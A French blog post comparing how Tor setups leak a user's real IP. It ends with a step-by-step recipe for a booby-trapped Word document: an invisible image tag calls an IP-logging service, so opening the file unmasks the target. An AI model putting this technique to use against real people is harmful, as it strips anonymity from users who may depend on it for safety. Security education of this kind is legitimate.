---
title: "Les Questions Cons du Hacking : Comment désanonymiser un utilisateur de Tor ?"
tags: [Réseau, Tor, Vie privée et anonymat]
---

S01E05 : Comment désanonymiser un utilisateur de Tor ?
------------------------------------------------------

Par désanonymiser un utilisateur de Tor, j'entends ici être en mesure de récupérer sa véritable adresse IP.  

### Est-ce faisable ? Bien-sûr ! Mais dans quelles mesures ?

Dernièrement on parle rarement de la désanonymisation d'un utilisateur de Tor seul et plus souvent de celle des hidden-services qui est, par mon expérience personnelle et par les cas de saisies qui ont fait les gros titres, pas toujours plus compliquée.  

Dans la plupart des cas l'attaque se concentre sur l'erreur humaine et le manque de maîtrise de Tor et des réseaux de la victime (que l'on parle d'utilisation ou d'administrateur de `.onion`).  

Il va de soi que ce degré de maîtrise devrait être à la mesure des dangers encourus par l'utilisateur de Tor et des compétences (et moyens techniques et financiers) de ses ennemis.  

On a vu que ce n'était pas le cas avec *Ross William Ulbricht* (créateur du premier *SilkRoad*) qui a lancé son hidden-service en ayant de très faibles connaissances en informatiques... Les autorités n'étaient sans doute pas aussi informées qu'elles le sont maintenant sur le sujet, ce qui peut expliquer la longévité du site.  

On a aussi vu plus récemment le forum *Deutschland im Deep web*, dont l'administrateur semblait bien plus compétent, saisit par le *BKA*, ce qui prouve à quel point la désanonymisation est possible et que la sécurisation des hidden-services et peut être plus difficile que cela peut sembler.  

Mais ici on se concentrera sur les utilisateurs seuls uniquement et non les hidden-services.  

### Configurations courantes des utilisateurs de Tor

D'abord on peut commencer par distinguer quatre différents types d'utilisation de Tor :  

* Un service Tor local lancé sur la machine avec un navigateur (pas forcément *Firefox*) configuré pour passer via Tor soit directement soit via un proxy HTTP redirigeant via Tor (*Polipo*, *Privoxy*).
* Une installation de *TorBrowser*
* Un Firefox dans une VM *Tails*
* Un Firefox dans une VM *Whonix*

**Le premier cas de configuration** est sans doute le plus vulnérable puisque toutes les vérifications sur les fuites de données sont à la charge de l'utilisateur qui devra prendre soin de désactiver les plugins dangereux (Flash, Java, etc), déterminer si le navigateur doit utiliser tel ou tel service intégré (safe browsing, etc) et éplucher la configuration avancée à la recherche de la petite bête.  

Toute erreur laissée pourrait alors être exploitée par un outil de decloaking comme celui mis en place par le projet *Metasploit* à une époque. Il existe de nombreux documents sur le sujet.  

Il y a aussi de grandes chances qu'il soit possible d'extraire un identifiant unique de la configuration de navigateur (fingerprinting), laissant la possibilité aux sites de reconnaître l'utilisateur quand bien même il utilise Tor et que le navigateur efface ses cookies à chaque arrêt.  

Toute action effectuée en dehors du navigateur peut amener l'utilisateur à révéler sa véritable adresse IP.  

L'erreur humaine peut aussi amener l'utilisateur à se dévoiler lui-même (changement temporaire de la configuration proxy du navigateur puis oubli de la remettre en place plus tard ou encore cookies non supprimés entre une session avec et une session sans Tor).  

**Dans le cas du *TorBrowser*** on dispose d'un navigateur Firefox qui a été modifié à sa base afin de restreindre le plus de fuites possibles et de cloisonner le comportement des pages web (empêcher l'ouverture de liens non-http) et du code javascript. Le navigateur a aussi été configuré de telle façon que le fingerprinting ne soit pas unique (mentir sur la taille de l'écran, le système d'exploitation utilisé ,etc). En contrepartie pour un site en clear ça doit rendre aisé la tache de déterminer si le navigateur est le TorBrowser ou non.  

Il est encore possible de jouer un peu avec la configuration du navigateur, mais on est soit vite dissuadé, soit ça ne fonctionne pas comme escompté (extensions qui ne semblent pas fonctionner).  

Là encore, toute action sortie du TorBrowser (comme ouvrir un fichier tout juste téléchargé) peut amener à la désanonymisation de l'utilisateur.  

L'exploitation d'une faille de sécurité touchant le navigateur ou un composant du système d'exploitation (rendu des images ou des polices de caractères par exemple) peut aussi amener à la compromission du système.  

***Tails*** propose déjà un niveau de sécurité plus acceptable via une machine virtuelle sur laquelle quelques applications sont préconfigurées pour passer par Tor et où tout le reste du trafic est tout simplement bloqué.  

De cette manière une connexion réseau à l'initiative d'une application préconfigurée réussira tandis que l'exécution d'une application réseau tiers échouera.  

Pour échapper à cet environnement il faudra soit amener l'utilisateur à effectuer une opération en dehors de la VM (peu probable) soit être en mesure de compromettre la VM (accès root) pour tenter d'altérer les règles de filtrage.
Ce type de VM axé sur Tor rend généralement difficile l'utilisation du compte root (mot de passe inconnu et utilisation de sudo impossible) et donc complique l'escalade de privilèges. Il faudra passer des options spécifiques à init pour débloquer cet accès.  

***Whonix*** est une VM tout comme *Tails* mais la différence principale est que *Whonix* redirige les communications de toutes les applications via Tor tant qu'il le peut. On est donc en mesure d'ajouter des applications de notre choix et selon leur mode de fonctionnement (Tor fait transiter du TCP et du DNS) elles passeront automatiquement à travers Tor ou dysfonctionneront (le reste du trafic est bloqué, comme dans *Tails*).  

La compromission totale de la VM devrait aussi pouvoir amener à réécrire les règles de filtrage, mais il est probable qu'en plus de l'accès root rendu difficile d'autres protections viennent endurcir le système (système de fichiers en lecture seule, AppArmor sur le navigateur, etc)  

### Le principe

Je vais présenter ici un cas de désanonymisation qui touche les deux premières configuration. Il faudra ici être en mesure d'inciter l'utilisateur à ouvrir un document Word téléchargé via Tor.  

Cela peut sembler suspect mais pour les personnes qui font du commerce via Tor on peut supposer que c'est assez courant (commandes, factures, etc).  

De plus avec le *TorBrowser*, accéder à Tor ne requiert aucune compétence informatique, on peut dès lors imaginer un client d'un market quelconque envoyer au vendeur une capture d'écran dans un fichier .doc pour se plaindre qu'un produit est défectueux.  

Le principe de l'attaque existe bien et a été dévoilé comme étant déjà exploité par les autorités (qui m'ont donné l'idée de l'article :) :  

> New: obtained the tool European cops likely used to unmask people on dark web. Excel file; connects to remote server <https://t.co/AH8SoDXn6H> [pic.twitter.com/W5vZrKXMbC](https://t.co/W5vZrKXMbC)
> 
> — Joseph Cox (@josephfcox) [25 août 2017](https://twitter.com/josephfcox/status/901030117442560001)

### La technique

[A la technique c'est *Michel*....](https://www.youtube.com/watch?v=7ceNf9qJjgc)  

La création d'un document piégé avec LibreOffice est d'une simplicité enfantine.  

Pour simplifier les choses, nous allons utiliser le service [IP Logger](https://iplogger.org/) via son logger invisible.  

On obtient alors l'URL d'une image d'un pixel sur un pixel capable de loguer les ips (le format de l'URL est du type https://iplogger.com/1GqnN6).  

On écrit alors un fichier HTML dans lequel on rentre simplement une balise IMG appelant l'image  

<img src="https://iplogger.com/1GqnN6" />  

Ensuite on crée un nouveau document *LibreOffice* et on insère le HTML via *Insertion > Document*. L'image est invisible et il faudrait être curieux pour remarquer quelque chose.  

![LibreOffice document insertion](/assets/img/libreoffice_trap/libreoffice_insert_doc.png)

Il ne reste plus qu'à ajouter d'autres éléments au document pour le rendre quelconque aux yeux de la victime et l'enregistrer au format .doc ou .docx (sur le .doc l'URL apparaîtra via un strings ou à l'aide d'un éditeur hexadécimal, le docx a l'avantage d'être compressé).  

On pourrait aussi jouer avec la gestion des avants et arrières plans des éléments dans le document pour dissimuler une image plus grande.  

Enfin on envoie le document piégé à la victime et on surveille les logs depuis iplogger.org.  

![iplogger ip addresses](/assets/img/libreoffice_trap/iplogger.png)

Si vous connaissez une technique similaire pour les PDFs vous pouvez m'en faire part par email.

*Published August 31 2017 at 21:29*
